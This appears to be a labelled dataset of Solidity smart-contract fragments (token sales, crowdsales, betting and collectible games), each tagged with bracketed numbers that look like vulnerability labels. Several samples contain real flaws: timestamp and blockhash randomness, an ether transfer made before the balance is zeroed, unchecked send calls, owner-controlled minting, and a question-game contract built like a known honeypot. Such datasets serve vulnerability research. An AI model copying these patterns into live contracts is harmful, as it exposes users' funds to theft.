        totalSupply = 2600000000e8;
        name = ""Kripton"";                           // Set the name for display purposes
        symbol = ""LPK"";                             // Set the symbol for display purposes
        decimals = 8;                               // Amount of decimals
        crowdSaleAddress = _crowdsaleAddress;
        balances[_crowdsaleAddress] = totalSupply;
    }
    // @notice unlock token for trading
    function unlock() public onlyAuthorized {
        locked = false;
    }
    // @lock token from trading during ICO
    function lock() public onlyAuthorized {
        locked = true;
    }
    // @notice transfer tokens to given address
    // @param _to {address} address or recipient
    // @param _value {uint} amount to transfer
    // @return  {bool} true if successful
    function transfer(address _to, uint _value) public onlyUnlocked returns(bool) {
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);",[64]
"		owner = msg.sender;
    }
}
contract Crowdsale is Ownable {
    using SafeMath for uint;
    WAEP public token ;
    uint start; //15dec
    uint end; //15feb
    uint softcapUSD;
    uint hardcapUSD;
    uint public risedUSD;
    uint hardcapTokens;
    uint oneTokenInWei;
    uint sale1 = 1000000*10**18;
    uint sale2 = 2000000*10**18;
    uint sale3 = 3000000*10**18;
    mapping (address => bool) refunded;
    mapping (address => uint256) saleBalances ;
    function Crowdsale() public{
        owner = msg.sender;
        start = 1513339200; //15dec
        end = 1518696000; //15feb
        softcapUSD = 350000*10**18;
        hardcapUSD = 3500000*10**18;
        hardcapTokens = 1000000000*10**18;
		oneTokenInWei = 1532355690402860; // init price $652.59 usd per eth
		token = new WAEP();
    }
    function setEthPrice(uint _new) onlyOwner {
        oneTokenInWei = _new;
    }
    function buyByBot(uint _usd, uint _tokens, address _to) onlyOwner {
        require( risedUSD + _usd < hardcapUSD );
        risedUSD += _usd*10**18;
        token.mint(_to, _tokens*10**18);
    }
    function() external payable {
        require(now > start && now < end);
        require( risedUSD + msg.value.mul(10**18).div(oneTokenInWei) < hardcapUSD );
        uint discountPrice ;
        if ( risedUSD < sale1 ) {
            discountPrice = oneTokenInWei.div(100).mul(60);
        } else if ( risedUSD < sale2 ) {
            discountPrice = oneTokenInWei.div(100).mul(70);
        } else if ( risedUSD < sale3 ) {
            discountPrice = oneTokenInWei.div(100).mul(80);
        } else {
           discountPrice = oneTokenInWei ;
        }
        uint256 tokenAdd = msg.value.mul(10**18).div(discountPrice);
        require(token.totalSupply() + tokenAdd < hardcapTokens);
        risedUSD += msg.value.mul(10**18).div(oneTokenInWei);
        saleBalances[msg.sender] = saleBalances[msg.sender].add(msg.value);
        token.mint(msg.sender, tokenAdd);
    }
    function getEth() public onlyOwner {
        owner.transfer(this.balance);
    }
    function mint(address _to, uint _value) public onlyOwner {
        require(_value > 0);
        token.mint(_to, _value*10**18);
    }
    function refund() public {
        require (now > end  && risedUSD < softcapUSD );
        require (!refunded[msg.sender]);
        require (saleBalances[msg.sender] != 0) ;
        uint refund = saleBalances[msg.sender];
        require(msg.sender.send(refund));
        refunded[msg.sender] = true;
    }
}",[64]
"        // token ownership
        mapping(address => uint256) balances;
        // spending permision management
        mapping(address => mapping(address => uint256)) allowed;
        address owner;
        //best 10 owners
        address[] best_wals;
        uint[] best_count;
        function StandardToken() {
            for(uint8 i = 0; i < 10; i++) {
                best_wals.push(address(0));
                best_count.push(0);
            }
        }
        /**
         * transfer() - transfer tokens from msg.sender balance
         *              to requested account
         *
         *  @param to    - target address to transfer tokens
         *  @param value - ammount of tokens to transfer
         *
         *  @return - success / failure of the transaction
         */
        function transfer(address to, uint256 value) returns(bool success) {
                if (balances[msg.sender] >= value && value > 0) {
                        // do actual tokens transfer
                        balances[msg.sender] -= value;
                        balances[to] += value;
                        CheckBest(balances[to], to);
                        // rise the Transfer event
                        Transfer(msg.sender, to, value);
                        return true;
                } else {
                        return false;
                }
        }
        function transferWithoutChangeBest(address to, uint256 value) returns(bool success) {
                if (balances[msg.sender] >= value && value > 0) {
                        // do actual tokens transfer
                        balances[msg.sender] -= value;
                        balances[to] += value;
                        // rise the Transfer event
                        Transfer(msg.sender, to, value);
                        return true;
                } else {
                        return false;
                }
        }
        /**
         * transferFrom() -
         *
         *  @param from  -
         *  @param to    -
         *  @param value -
         *
         *  @return
         */
        function transferFrom(address from, address to, uint256 value) returns(bool success) {
                if (balances[from] >= value &&
                        allowed[from][msg.sender] >= value &&
                        value > 0) {
                        // do the actual transfer
                        balances[from] -= value;
                        balances[to] += value;
                        CheckBest(balances[to], to);
                        // addjust the permision, after part of
                        // permited to spend value was used
                        allowed[from][msg.sender] -= value;
                        // rise the Transfer event
                        Transfer(from, to, value);
                        return true;
                } else {
                        return false;
                }
        }
        function CheckBest(uint _tokens, address _address) {
            //дописать токен проверку лучших (перенести из краудсейла)
            for(uint8 i = 0; i < 10; i++) {
                            if(best_count[i] < _tokens) {
                                for(uint8 j = 9; j > i; j--) {
                                    best_count[j] = best_count[j-1];
                                    best_wals[j] = best_wals[j-1];
                                }
                                best_count[i] = _tokens;
                                best_wals[i] = _address;
                                break;
                            }
                        }
        }
        /**
         *
         * balanceOf() - constant function check concrete tokens balance
         *
         *  @param owner - account owner
         *
         *  @return the value of balance
         */
        function balanceOf(address owner) constant returns(uint256 balance) {
                return balances[owner];
        }
        /**
         *
         * approve() - function approves to a person to spend some tokens from
         *           owner balance.
         *
         *  @param spender - person whom this right been granted.
         *  @param value   - value to spend.
         *
         *  @return true in case of succes, otherwise failure
         *
         */
        function approve(address spender, uint256 value) returns(bool success) {
                // now spender can use balance in
                // ammount of value from owner balance
                allowed[msg.sender][spender] = value;
                // rise event about the transaction
                Approval(msg.sender, spender, value);
                return true;
        }
        /**
         *
         * allowance() - constant function to check how mouch is
         *               permited to spend to 3rd person from owner balance
         *
         *  @param owner   - owner of the balance
         *  @param spender - permited to spend from this balance person
         *
         *  @return - remaining right to spend",[64]
"        }
        // copy it to a shorter array
        uint[] memory smallerArray = new uint[](numberOfMatches);
        for (uint j = 0; j < numberOfMatches; j++) {
            smallerArray[j] = matchIds[j];
        }
        return (smallerArray);
    }
    function getMatchReport(uint256 _matchId) public {
        Match storage theMatch = matches[_matchId];
        require(theMatch.id > 0 && !theMatch.reported);
        uint256 index;
        // if a match was one sided, refund all players
        if (theMatch.homeTeamPlayersCount == 0 || theMatch.awayTeamPlayersCount == 0)
        {
            for (index = 0; index < theMatch.homeTeamPlayersCount; index++) {
                players[theMatch.homeTeamPlayers[index].account].balance += theMatch.playerEntryPrice;
            }
            for (index = 0; index < theMatch.awayTeamPlayersCount; index++) {
                players[theMatch.awayTeamPlayers[index].account].balance += theMatch.playerEntryPrice;
            }
        } else {
            // Get the account balances of each team, NOT the in game balance.
            uint256 htpBalance = 0;
            for (index = 0; index < theMatch.homeTeamPlayersCount; index++) {
               htpBalance += theMatch.homeTeamPlayers[index].account.balance;
            }
            uint256 atpBalance = 0;
            for (index = 0; index < theMatch.awayTeamPlayersCount; index++) {
               atpBalance += theMatch.awayTeamPlayers[index].account.balance;
            }
            theMatch.homeScore = htpBalance % 5;
            theMatch.awayScore = atpBalance % 5;
            // We want a distinct winner
            if (theMatch.homeScore == theMatch.awayScore)
            {
                if(block.timestamp % 2 == 0){
                  theMatch.homeScore += 1;
                } else {
                  theMatch.awayScore += 1;
                }
            }
            uint256 prizeMoney = 0;
            if(theMatch.homeScore > theMatch.awayScore){
              // home wins
              theMatch.winningTeam = theMatch.homeTeam;
              prizeMoney = SafeMath.mul(theMatch.playerEntryPrice, theMatch.awayTeamPlayersCount);
            } else {
              // away wins
              theMatch.winningTeam = theMatch.awayTeam;
              prizeMoney = SafeMath.mul(theMatch.playerEntryPrice, theMatch.homeTeamPlayersCount);
            }
    	    uint256 onePercent = SafeMath.div(prizeMoney, 100);
            uint256 developerAllocation = SafeMath.mul(onePercent, 1);
            uint256 teamOwnerAllocation = SafeMath.mul(onePercent, 9);
            uint256 playersProfit = SafeMath.mul(onePercent, 90);
            uint256 playersProfitShare = 0;
            // Allocate funds to players
            if (theMatch.winningTeam == theMatch.homeTeam)
            {
                playersProfitShare = SafeMath.add(SafeMath.div(playersProfit, theMatch.homeTeamPlayersCount), theMatch.playerEntryPrice);
                for (index = 0; index < theMatch.homeTeamPlayersCount; index++) {
                    players[theMatch.homeTeamPlayers[index].account].balance += playersProfitShare;
                }
            } else {
                playersProfitShare = SafeMath.add(SafeMath.div(playersProfit, theMatch.awayTeamPlayersCount), theMatch.playerEntryPrice);
                for (index = 0; index < theMatch.awayTeamPlayersCount; index++) {
                    players[theMatch.awayTeamPlayers[index].account].balance += playersProfitShare;
                }
            }
            // Allocate to team owner
            teams[theMatch.winningTeam].balance += teamOwnerAllocation;
            theMatch.winningTeamBonus = teamOwnerAllocation;
            // Allocate to developer
	        developerBalance += developerAllocation;
            emit MatchFinished(theMatch.id, theMatch.homeTeam, theMatch.awayTeam, theMatch.winningTeam, teamOwnerAllocation);
        }
        theMatch.reported = true;
    }
    function getReportedMatches() public constant returns(uint256[]) {
        if(matchCounter == 0) {
            return new uint[](0);
        }
        // We only return matches for the last x hours - everything else is on chain
        uint256[] memory matchIds = new uint256[](matchCounter);
        uint256 numberOfMatches = 0;
        for (uint256 i = 1; i <= matchCounter; i++) {
            if (matches[i].reported && now > matches[i].fullTime && matches[i].fullTime + dataVisibleWindow > now) {
                matchIds[numberOfMatches] = matches[i].id;
                numberOfMatches++;
            }
        }
        // copy it to a shorter array
        uint[] memory smallerArray = new uint[](numberOfMatches);
        for (uint j = 0; j < numberOfMatches; j++) {
            smallerArray[j] = matchIds[j];
        }
        return (smallerArray);
    }
    function playerPrizeClaim() public {
        require(_addressNotNull(msg.sender));
        require(players[msg.sender].account != address(0));
        msg.sender.transfer(players[msg.sender].balance);
        players[msg.sender].balance = 0;
    }
    function teamPrizeClaim(uint256 _teamId) public {
        require(_addressNotNull(msg.sender));
        require(teams[_teamId].init);
        // This allows for sniping of teams. If a balance increases because teams have won games with bets on them
        // then it is down to the owner to claim the prize. If someone spots a build up of balance on a team
        // and then buys the team they can claim the prize. This is the intent.
        teams[_teamId].owner = cryptoCupTokenContract.ownerOf(_teamId);
        // This way the claimant either gets the balance because he sniped the team
        // Or he initiates the transfer to the rightful owner
        teams[_teamId].owner.transfer(teams[_teamId].balance);
        emit TeamOwnerPaid(_teamId, teams[_teamId].balance);
        teams[_teamId].balance = 0;
    }
    /********----------- PRIVATE FUNCTIONS ------------********/
    function _addressNotNull(address _to) private pure returns (bool) {
        return _to != address(0);
    }
}
contract CryptoCupToken {
    function ownerOf(uint256 _tokenId) public view returns (address addr);
}","[26, 103]"
"pragma solidity ^0.4.20;
contract CryptoGame
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function set_game(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"            cryptoRomeLandNFTContract.composeLand(cityTokenId, town1TokenId, town2TokenId, town3TokenId);
            return cityTokenId;
        }
    }
}
interface RandomNumGeneration {
    function getRandomNumber(uint256 seed) external returns (uint256);
}
contract ImprovementGeneration is CryptoRomeControl {
    using SafeMath for uint256;
    // Set in case the contract needs to be updated
    address public newContractAddress;
    RandomNumGeneration public randomNumberSource;
    uint256 public rarityValueMax;
    uint256 public latestPseudoRandomNumber;
    uint8 public numResourceImprovements;
    mapping(uint8 => uint256) private improvementIndexToRarityValue;
    constructor () public {
        // Starting Improvements
        // improvement => rarity value (lower number = higher rarity)
        improvementIndexToRarityValue[1] = 256;  // Wheat
        improvementIndexToRarityValue[2] = 256;  // Wood
        improvementIndexToRarityValue[3] = 128;  // Grapes
        improvementIndexToRarityValue[4] = 128;  // Stone
        improvementIndexToRarityValue[5] = 64;   // Clay
        improvementIndexToRarityValue[6] = 64;   // Fish
        improvementIndexToRarityValue[7] = 32;   // Horse
        improvementIndexToRarityValue[8] = 16;   // Iron
        improvementIndexToRarityValue[9] = 8;    // Marble
        // etc --> More can be added in the future
        // max resource improvement types is 63
        numResourceImprovements = 9;
        rarityValueMax = 952;
    }
    function setNewAddress(address _v2Address) external onlyOwner {
        require (_v2Address != address(0));
        newContractAddress = _v2Address;
        emit ContractUpgrade(_v2Address);
    }
    function setRandomNumGenerationContract(address _randomNumberGenAddress) external onlyOwner {
        require (_randomNumberGenAddress != address(0));
        randomNumberSource = RandomNumGeneration(_randomNumberGenAddress);
    }
    function genInitialResourcesForVillage(uint256 numImprovements, bool useRandomInput) external anyOperator returns(uint256) {
        require(numImprovements <= 6);
        uint256 landImprovements;
        // each improvement takes up one village slot (max 6 slots)
        for (uint256 i = 0; i < numImprovements; i++) {
            uint8 newImprovement = generateImprovement(useRandomInput);
            // each slot is a 32 bit section in the 256 bit landImprovement value
            landImprovements |= uint256(newImprovement) << (32*i);
        }
        return landImprovements;
    }
    function generateImprovement(bool useRandomSource) public anyOperator returns (uint8 newImprovement) {
        // seed does not need to be anything super fancy for initial improvement generation for villages...
        // players will not be performing that operation, so this should be random enough
        uint256 seed = latestPseudoRandomNumber.add(now);
        if (useRandomSource) {
            // for cases where players are generating land (i.e. after initial distribution of villages), there
            // will need to be a better source of randomness
            seed = randomNumberSource.getRandomNumber(seed);
        }
        latestPseudoRandomNumber = addmod(uint256(blockhash(block.number-1)), seed, rarityValueMax);
        // do lookup for the improvement
        newImprovement = lookupImprovementTypeByRarity(latestPseudoRandomNumber);
    }
    function lookupImprovementTypeByRarity(uint256 rarityNum) public view returns (uint8 improvementType) {
        uint256 rarityIndexValue;
        for (uint8 i = 1; i <= numResourceImprovements; i++) {
            rarityIndexValue += improvementIndexToRarityValue[i];
            if (rarityNum < rarityIndexValue) {
                return i;
            }
        }
        return 0;
    }
    function addNewResourceImprovementType(uint256 rarityValue) external onlyOwner {
        require(rarityValue > 0);
        require(numResourceImprovements < 63);
        numResourceImprovements++;
        rarityValueMax += rarityValue;
        improvementIndexToRarityValue[numResourceImprovements] = rarityValue;
    }
    function updateImprovementRarityValue(uint256 rarityValue, uint8 improvementIndex) external onlyOwner {
        require(rarityValue > 0);
        require(improvementIndex <= numResourceImprovements);
        rarityValueMax -= improvementIndexToRarityValue[improvementIndex];
        rarityValueMax += rarityValue;
        improvementIndexToRarityValue[improvementIndex] = rarityValue;
    }
}",[64]
"  event ThingBorn(uint256 indexed thingId, uint256 initialPrice);
  event ThingDestroyed(uint256 indexed thingId);
  event ThingSold(
    uint256 indexed thingId,
    uint256 oldPrice,
    uint256 newPrice,
    address oldOwner,
    address newOwner
  );
  function () payable public {
    // someone sent a gift! yay!
    owner.transfer(msg.value);
  }
  function name() constant public returns (string) {
    return NAME;
  }
  function symbol() constant public returns (string) {
    return SYMBOL;
  }
  function addThing(
    uint256 _parentId,
    uint256 _purchasePrice,
    uint256 _growthRate,
    uint256 _dividendRate,
    bytes32 _displayName
  ) public onlyOwner returns (uint256 thingId) {
    thingId = ++numThings;
    things[thingId] = Thing({
      id: thingId,
      parentId: _parentId,
      purchasePrice: _purchasePrice == 0 ? floorPrice : _purchasePrice,
      growthRate: _growthRate == 0 ? standardGrowthRate : _growthRate,
      dividendRate: _dividendRate,
      dividendsPaid: 0,
      lastAction: block.timestamp,
      displayName: _displayName
    });
    if (_parentId != 0) descendantsOfThing[_parentId].push(thingId);
    _mint(msg.sender, thingId);
    ThingBorn(thingId, things[thingId].purchasePrice);
  }
  function purchase(uint256 _thingId) public payable {
    require(_thingId != 0 && _thingId <= numThings);
    address previousOwner = ownerOf(_thingId);
    require(previousOwner != msg.sender);
    Thing storage thing = things[_thingId];
    uint256[] storage descendants = descendantsOfThing[_thingId];
    uint256 currentPrice = getCurrentPrice(_thingId);
    require(msg.value >= currentPrice);
    if (msg.value > currentPrice) {
      OverpaymentRefunded(currentPrice, msg.value.sub(currentPrice));
      msg.sender.transfer(msg.value.sub(currentPrice));
    }
    if (thing.dividendRate != 0 && (thing.parentId != 0 || descendants.length > 0)) {
      uint256 numDividends = thing.parentId == 0 ? descendants.length : descendants.length.add(1);
      uint256 dividendPerRecipient = getDividendPayout(
        currentPrice,
        thing.dividendRate,
        numDividends
      );
      address dividendRecipient = address(this);
      for (uint256 i = 0; i < numDividends; i++) {
        dividendRecipient = ownerOf(
          i == descendants.length ? thing.parentId : descendants[i]
        );
        dividendRecipient.transfer(dividendPerRecipient);
        DividendPaid(dividendRecipient, dividendPerRecipient);
      }
      thing.dividendsPaid = thing.dividendsPaid.add(dividendPerRecipient.mul(numDividends));
    }
    uint256 previousHolderShare = currentPrice.sub(
      dividendPerRecipient.mul(numDividends)
    );
    uint256 fee = previousHolderShare.div(20);
    owner.transfer(fee);
    previousOwner.transfer(previousHolderShare.sub(fee));
    thing.purchasePrice = thing.purchasePrice.mul(thing.growthRate).div(100);
    thing.lastAction = block.timestamp;
    clearApprovalAndTransfer(previousOwner, msg.sender, _thingId);
    ThingSold(_thingId, currentPrice, thing.purchasePrice, previousOwner, msg.sender);
  }
  function purchaseGame() public payable {
    require(msg.sender != owner);
    require(msg.value >= gameCost);
    owner.transfer(msg.value);
    owner = msg.sender;
    OwnershipTransferred(owner, msg.sender);
  }
  function setGameCost(uint256 newCost) public onlyOwner {
    gameCost = newCost;
  }
  function getDescendantsOfThing(uint256 _thingId) public view returns (uint256[]) {
    return descendantsOfThing[_thingId];
  }
  function getCurrentPrice(
    uint256 _thingId
  ) public view returns (uint256 currentPrice) {
    require(_thingId != 0 && _thingId <= numThings);
    Thing storage thing = things[_thingId];
    currentPrice = getPurchasePrice(thing.purchasePrice, thing.growthRate);
  }
  function getPurchasePrice(
    uint256 _currentPrice,
    uint256 _priceIncrease
  ) internal pure returns (uint256 currentPrice) {
    currentPrice = _currentPrice.mul(_priceIncrease).div(100);
  }
  function getDividendPayout(
    uint256 _purchasePrice,
    uint256 _dividendRate,
    uint256 _numDividends
  ) public pure returns (uint256 dividend) {
    dividend = _purchasePrice.mul(
      _dividendRate
    ).div(
      100
    ).sub(
      _purchasePrice
    ).div(
      _numDividends
    );
  }
}","[62, 66]"
"    }
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    uint256 public totalSupply;
}
contract CrystalReignShard is StandardToken { // CHANGE THIS. Update the contract name.
  using SafeMath for uint;
    /* Public variables of the token */
    /*
    NOTE:
    The following variables are OPTIONAL vanities. One does not have to include them.
    They allow one to customise the token contract & in no way influences the core functionality.
    Some wallets/interfaces might not even bother to look at this information.
    */
    string public name;                   // Token Name
    uint8 public decimals;                // How many decimals to show. To be standard complicant keep it 18
    string public symbol;                 // An identifier: eg SBX, XPR etc..
    string public version = 'H1.0';
    uint256 public unitsOneEthCanBuy;
    uint256 public preSalePrice;
    uint256 public totalEthInWei;
    address public fundsWallet;
    address public dropWallet = 0x88d38F6cb2aF250Ab8f1FA24851ba312b0c48675;
    address public compWallet = 0xCf794896c1788F799dc141015b3aAae0721e7c27;
    address public marketingWallet = 0x49cc71a3a8c7D14Bf6a868717C81b248506402D8;
    uint256 public bonusETH = 0;
    uint256 public bonusCRS = 0;
    uint public start = 1519477200;
    uint public mintCount = 0;
    // This is a constructor function
    // which means the following function name has to match the contract name declared above
    function CrystalReignShard() {
        balances[msg.sender] = 16400000000000000000000000;               // Give the creator all initial tokens. This is set to 1000 for example. If you want your initial tokens to be X and your decimal is 5, set this value to X * 100000. (CHANGE THIS)
        balances[dropWallet] = 16400000000000000000000000;
        balances[compWallet] = 16400000000000000000000000;
        balances[marketingWallet] = 80000000000000000000000;
        totalSupply = 50000000;                        // Update total supply (1000 for example) (CHANGE THIS)
        name = ""Crystal Reign Shard"";                                   // Set the name for display purposes (CHANGE THIS)
        decimals = 18;                                               // Amount of decimals for display purposes (CHANGE THIS)
        symbol = ""CRS"";                                             // Set the symbol for display purposes (CHANGE THIS)
        unitsOneEthCanBuy = 1000;                                      // Set the price of your token for the ICO (CHANGE THIS)
        preSalePrice = 1300;
        fundsWallet = msg.sender;                                    // The owner of the contract gets ETH
    }
    function() payable{
        totalEthInWei = totalEthInWei + msg.value;
        uint256 amount = msg.value * unitsOneEthCanBuy;
        if (now < 1524571200) {
          amount = msg.value * preSalePrice;
        }
        if (balances[fundsWallet] < amount) {
            msg.sender.transfer(msg.value);
            return;
        }
        balances[fundsWallet] = balances[fundsWallet] - amount;
        balances[msg.sender] = balances[msg.sender] + amount;
        Transfer(fundsWallet, msg.sender, amount); // Broadcast a message to the blockchain
        //Transfer ether to fundsWallet
        fundsWallet.transfer(msg.value);
    }
    /* Approves and then calls the receiving contract */
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.
        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)
        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.
        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }
        return true;
    }
    function mint(){
      if (now >= start + (5 years * mintCount) && msg.sender == fundsWallet) {
        balances[dropWallet] += 16400000;
        mintCount++;
        totalSupply += 16400000;
      }
    }
      function tileDrop(address[] winners) returns(bool success){
      if(msg.sender == fundsWallet){
        uint256 amount = 1000000000000000000000;
        for(uint winList = 0; winList < winners.length; winList++){
          winners[winList].transfer(bonusETH.div(64));
          balances[winners[winList]] = balances[winners[winList]] + amount;
          bonusETH -= bonusETH.div(64);
            if (balances[dropWallet] >= amount) {
            balances[dropWallet] = balances[dropWallet] - amount;
            balances[winners[winList]] = balances[winners[winList]] + bonusCRS.div(64);
            bonusCRS -= bonusCRS.div(64);
              }
          Transfer(dropWallet, msg.sender, amount); // Broadcast a message to the blockchain
        }
        balances[fundsWallet] = balances[fundsWallet] + bonusCRS;
        bonusCRS = 0;
        Transfer(fundsWallet, msg.sender, bonusETH); // Broadcast a message to the blockchain
        //Transfer ether to fundsWallet
        fundsWallet.transfer(bonusETH);
        bonusETH = 0;
        return true;
        }
        else{
        return false;
        }
        }
        function purchaseETH() payable returns(uint t){//
          bonusETH +=  (msg.value.div(5)).mul(4);
          Transfer(fundsWallet, msg.sender, (msg.value.div(5))); // Broadcast a message to the blockchain
          fundsWallet.transfer(msg.value.div(5));
          return block.timestamp;
        }
        function purchaseCRS(uint256 amount) public returns(bool success){//
          if(balances[msg.sender] >= amount){
            balances[fundsWallet] = balances[fundsWallet] + amount.div(5);
            bonusCRS += (amount.div(5)).mul(4);
            balances[msg.sender] = balances[msg.sender] - amount;
          }
          //Transfer(fundsWallet, msg.sender, amount); // Broadcast a message to the blockchain
          return true;
          }
}","[46, 81, 82]"
"    constructor() public {
        administrator = msg.sender;
        // set interface contract
        MiningWarContract = CryptoMiningWarInterface(0xf84c61bb982041c030b8580d1634f00fffb89059);
        EngineerContract = CryptoEngineerInterface(0x69fd0e5d0a93bf8bac02c154d343a8e3709adabf);
    }
    function () public payable
    {
    }
    /**
    * @dev MainContract used this function to verify game's contract
    */
    function isContractMiniGame() public pure returns( bool _isContractMiniGame )
    {
    	_isContractMiniGame = true;
    }
    /**
    * @dev Main Contract call this function to setup mini game.
    */
    function setupMiniGame( uint256 /*_miningWarRoundNumber*/, uint256 _miningWarDeadline ) public
    {
        miningWarDeadline = _miningWarDeadline;
    }
    /**
    * @dev start the mini game
    */
     function startGame() public
    {
        require(msg.sender == administrator);
        require(init == false);
        init = true;
        miningWarDeadline = getMiningWarDealine();
        games[round].ended = true;
        startRound();
    }
    function startRound() private
    {
        require(games[round].ended == true);
        uint256 crystalsLastRound = games[round].crystals;
        uint256 prizePoolLastRound= games[round].prizePool;
        round = round + 1;
        uint256 endTime = now + HALF_TIME;
        // claim 5% of current prizePool as rewards.
        uint256 engineerPrizePool = getEngineerPrizePool();
        uint256 prizePool = SafeMath.div(SafeMath.mul(engineerPrizePool, 5),100);
        if (crystalsLastRound <= 0) {
            prizePool = SafeMath.add(prizePool, prizePoolLastRound);
        }
        EngineerContract.claimPrizePool(address(this), prizePool);
        games[round] = Game(round, 0, prizePool, endTime, false);
    }
    function endRound() private
    {
        require(games[round].ended == false);
        require(games[round].endTime <= now);
        Game storage g = games[round];
        g.ended = true;
        startRound();
        emit EndRound(g.round, g.crystals, g.prizePool, g.endTime);
    }
    /**
    * @dev player send crystals to the pot
    */
    function share(uint256 _value) public disableContract
    {
        require(miningWarDeadline > now);
        require(games[round].ended == false);
        require(_value >= 10000);
        MiningWarContract.subCrystal(msg.sender, _value);
        if (games[round].endTime <= now) endRound();
        updateReward(msg.sender);
        Game storage g = games[round];
        uint256 _share = SafeMath.mul(_value, CRTSTAL_MINING_PERIOD);
        g.crystals = SafeMath.add(g.crystals, _share);
        Player storage p = players[msg.sender];
        if (p.currentRound == round) {
            p.share = SafeMath.add(p.share, _share);
        } else {
            p.share = _share;
            p.currentRound = round;
        }
    }
    function withdrawReward() public disableContract
    {
        if (games[round].endTime <= now) endRound();
        updateReward(msg.sender);
        Player storage p = players[msg.sender];
        msg.sender.send(p.reward);
        // update player
        p.reward = 0;
    }
    function updateReward(address _addr) private
    {
        Player storage p = players[_addr];
        if (
            games[p.currentRound].ended == true &&
            p.lastRound < p.currentRound
            ) {
            p.reward = SafeMath.add(p.share, calculateReward(msg.sender, p.currentRound));
            p.lastRound = p.currentRound;
        }
    }
      /**
    * @dev calculate reward
    */
    function calculateReward(address _addr, uint256 _round) public view returns(uint256)
    {
        Player memory p = players[_addr];
        Game memory g = games[_round];
        if (g.endTime > now) return 0;
        if (g.crystals == 0) return 0;
        return SafeMath.div(SafeMath.mul(g.prizePool, p.share), g.crystals);
    }
    function getEngineerPrizePool() private view returns(uint256)
    {
        return EngineerContract.prizePool();
    }
    function getMiningWarDealine () private view returns(uint256)
    {
        return MiningWarContract.deadline();
    }
}","[41, 42, 85, 88]"
"        // 10	59049	0.30	17714.7
        // Direct sponcer income
        // Pool one sponser income 0.10
        // Pool Two sponcer income 0.15
        // Pool three sponcer income 0.30
        // Pool four sponser income 0.90
        // Pool five sponcer income 1.50
        // Company maintenance
        // Pool 1   0.02
        // Pool 2    0.05
        // Pool 3    0.10
        // Pool 4    0.30
        // Pool 5     0.50
/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract CyberTrustMoney {
    event Multisended(uint256 value , address sender);
    using SafeMath for uint256;
    function multisendEther(address[] _contributors, uint256[] _balances) public payable {
        uint256 total = msg.value;
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i] );
            total = total.sub(_balances[i]);
            _contributors[i].transfer(_balances[i]);
        }
        emit Multisended(msg.value, msg.sender);
    }
}",[64]
" * Utility library of inline functions on addresses
 *
 * Source https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-solidity/v2.1.3/contracts/utils/Address.sol
 * This contract is copied here and renamed from the original to avoid clashes in the compiled artifacts
 * when the user imports a zos-lib contract (that transitively causes this contract to be compiled and added to the
 * build/artifacts folder) as well as the vanilla Address implementation from an openzeppelin version.
 */
library OpenZeppelinUpgradesAddress {
    /**
     * Returns whether the target address is a contract
     * @dev This function will return false if invoked during the constructor of a contract,
     * as the code is not actually created until after the constructor finishes.
     * @param account address of the account to check
     * @return whether the target address is a contract
     */
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        // XXX Currently there is no better way to check if there is a contract in an address
        // than to check the size of the code at that address.
        // See https://ethereum.stackexchange.com/a/14016/36603
        // for more details about how this works.
        // TODO Check this again before the Serenity release, because all addresses will be
        // contracts then.
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }
}
/*
    Copyright 2018-2019 zOS Global Limited
    Copyright 2020 Elastic Network, based on the work of Empty Set Squad and Dynamic Dollar Devs <elasticnetwork@protonmail.com>
    Licensed under the Apache License, Version 2.0 (the ""License"");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at
    http://www.apache.org/licenses/LICENSE-2.0
    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an ""AS IS"" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
*/
/**
 * Based off of, and designed to interface with, openzeppelin/upgrades package
 */
contract Upgradeable is State {
    /**
     * @dev Storage slot with the address of the current implementation.
     * This is the keccak-256 hash of ""eip1967.proxy.implementation"" subtracted by 1, and is
     * validated in the constructor.
     */
